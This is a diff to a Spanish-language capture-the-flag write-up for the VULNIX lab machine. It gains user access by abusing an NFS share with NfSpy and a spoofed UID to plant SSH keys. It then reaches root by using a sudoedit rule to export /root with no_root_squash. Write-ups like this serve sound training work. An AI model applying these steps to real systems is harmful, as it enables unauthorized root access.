@@ -142,6 +142,9 @@ Received heartbeat response:
   0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
 ```
 
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix1.jpg" width="80%"></img>
+
+
 ### Montando la carpeta NFS
 
 - Un poco de teoría previa. Hay dos opciones de seguridad que se debe conocer en NFS:
@@ -165,9 +168,157 @@ root@kali:~/VULNIX# ls -la /mnt/share/
 ls: cannot open directory '/mnt/share/': Permission denied
 ```
 
-- Para tener permisos 
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix2.jpg" width="80%"></img>
+
+- Para tener permisos sobre la carpeta requerimos crear un USUARIO en el Sist. Operativo con el ID del usuario de la máquina VULNIX, es decir, KALI y VULNIX deben tener un usuario con el mismo ID, el problema es obvio. ¿Cuál es ese ID? 
+
+- Existen dos maneras de poder obtener ese ID: 
+> Adivinar por ensayo/error ese ID. Probar desde 1000 en adelante.
+> Automatizar la búsqueda del ID. Para esto podemos crear un SCRIPT o utilizar uno que ya existe que se llama NFSPY.
+
+https://github.com/bonsaiviking/NfSpy
+
+```
+root@kali:~/VULNIX/vulnix/192.168.78.143/scans# nfspysh -o server=192.168.78.143:/home/vulnix
+nfspy@192.168.78.143:/home/vulnix:/> ls
+/:
+040700   2008   2008        4096 2021-03-01 16:12:21 .cache
+040750   2008   2008        4096 2021-03-01 21:22:42 .
+100644   2008   2008         220 2012-04-03 11:58:14 .bash_logout
+104777      0      0     1037528 2021-03-01 21:22:42 bash
+100644   2008   2008         675 2012-04-03 11:58:14 .profile
+100600   2008   2008         360 2021-03-01 21:29:53 .bash_history
+040750   2008   2008        4096 2021-03-01 21:22:42 ..
+100644   2008   2008        3486 2012-04-03 11:58:14 .bashrc
+
+```
+
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix3.jpg" width="80%"></img>
+
+- Podemos ver que el ID del usuario es 2008. Como ejercicio alternativo podriamos crear el usuario y analizar el mismo comportamiento.
+
+```
+root@kali:/mnt# useradd vulnix -u 2008
+root@kali:/tmp# su vulnix
+$ cd /mnt/share
+$ ls -la
+total 1056
+drwxr-x--- 4 nobody 4294967294    4096 Mar  1 22:51 .
+drwxr-xr-x 3 root   root          4096 Mar  1 19:12 ..
+-rwsrwxrwx 1 root   root       1037528 Mar  1 21:22 bash
+-rw------- 1 nobody 4294967294     360 Mar  1 21:29 .bash_history
+-rw-r--r-- 1 nobody 4294967294     220 Apr  3  2012 .bash_logout
+-rw-r--r-- 1 nobody 4294967294    3486 Apr  3  2012 .bashrc
+drwx------ 2 nobody 4294967294    4096 Mar  1 16:12 .cache
+-rw-r--r-- 1 nobody 4294967294       8 Mar  1 17:06 nfs.txt
+-rw-r--r-- 1 nobody 4294967294    2486 Mar  1 22:51 omar.txt
+-rw-r--r-- 1 nobody 4294967294     675 Apr  3  2012 .profile
+drwxr-xr-x 2 nobody 4294967294    4096 Mar  1 16:11 .ssh
+
+```
+
+### Copiando llaves SSH para establecer la conexión
+
+> Aquí toca saber la teoría de las llaves SSH y como utilizarlas para no requerir credenciales. En resumen debemos realizar lo siguiente:
+
+```
+En KALI Linux:
+
+root@kali:/mnt# ssh-keygen 
+root@kali:/# cp /root/.ssh/id_rsa.pub /tmp/authorized_keys
+root@kali:/# chown vulnix:vulnix /tmp/authorized_keys
+```
+
+- A través del acceso a NFS que obtuvimos cargamos la llave pública SSH.
+- Importante: Tienes que conocer la teoría detrás de las llaves SSH, sino te pierdes.
+
+```
+nfspy@192.168.78.143:/home/vulnix:/> ls
+/:
+040700   2008   2008        4096 2021-03-01 16:12:21 .cache
+040750   2008   2008        4096 2021-03-01 23:03:26 .
+100644   2008   2008           8 2021-03-01 17:06:05 nfs.txt
+100644   2008   2008         220 2012-04-03 11:58:14 .bash_logout
+100644   2008   2008        2486 2021-03-01 22:51:31 omar.txt
+100644   2008   2008         675 2012-04-03 11:58:14 .profile
+100600   2008   2008         360 2021-03-01 21:29:53 .bash_history
+040750   2008   2008        4096 2021-03-01 23:03:26 ..
+100644   2008   2008        3486 2012-04-03 11:58:14 .bashrc
+nfspy@192.168.78.143:/home/vulnix:/> mkdir .ssh
+nfspy@192.168.78.143:/home/vulnix:/> cd .ssh                      
+nfspy@192.168.78.143:/home/vulnix:/.ssh> put /tmp/authorized_keys  
+nfspy@192.168.78.143:/home/vulnix:/.ssh> ls  
+/.ssh:
+040755   2008   2008        4096 2021-03-01 23:04:19 .
+100644   2008   2008         563 2021-03-01 23:04:19 authorized_keys
+040750   2008   2008        4096 2021-03-01 23:03:52 ..
+```
+
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix4.jpg" width="80%"></img>
+
+### Estableciendo conexión SSH:
+
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix5.jpg" width="80%"></img>
 
 
+## Elevar Privilegios
+
+- Una vez que estamos dentro con el usuario VULNIX, toca buscar a través de todas las técnicas como elevar privilegios.
+- El mecanismo esta vez parece ser sencillo, a través de SUDO podemos elevar privilegios:
+
+```
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+```
+
+- Por casualidades de la vida (clásico de un CTF) podemos editar el archivo EXPORTS para compartir archivos por NFS.
+- Lo más lógico me parece repetir el proceso anterior, es decir, compartir la carpeta /root, subir las llaves SSH y listo. Veamos que pasa.
+
+
+### Editamos el archivo EXPORTS
+
+```
+vulnix@vulnix:~$ sudoedit /etc/exports
+
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/vulnix    *(rw,root_squash)
+/root           *(rw,no_root_squash)
+```
+
+- Nótese que estoy añadiendo "no_root_squash" esto para no tener que adivinar el ID del usuario y poder montar directamente con permisos del usuario root.
+- Debemos reiniciar el servicio para que los cambios sean efectivos. Busqué miles de formas, sin éxito. Toca reiniciar manualmente el servidor. Ni modo.
+
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix6.jpg" width="80%"></img>
+
+
+- Repetimos el mismo proceso de copiar las llaves públicas en el usuario ROOT y nos conectamos.
+
+```
+root@kali:/tmp# showmount -e 192.168.78.143
+Export list for 192.168.78.143:
+/root        *
+/home/vulnix *
+
+root@kali:/tmp# mount -t nfs 192.168.78.143:/root /mnt/share/
+root@kali:/mnt/share# mkdir .ssh
+root@kali:/mnt/share# cp /tmp/authorized_keys .ssh/
+root@kali:/mnt/share# chmod 600 .ssh/authorized_keys 
+root@kali:/home# ssh root@192.168.78.143
+```
+<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix7.jpg" width="80%"></img>
 
 
 
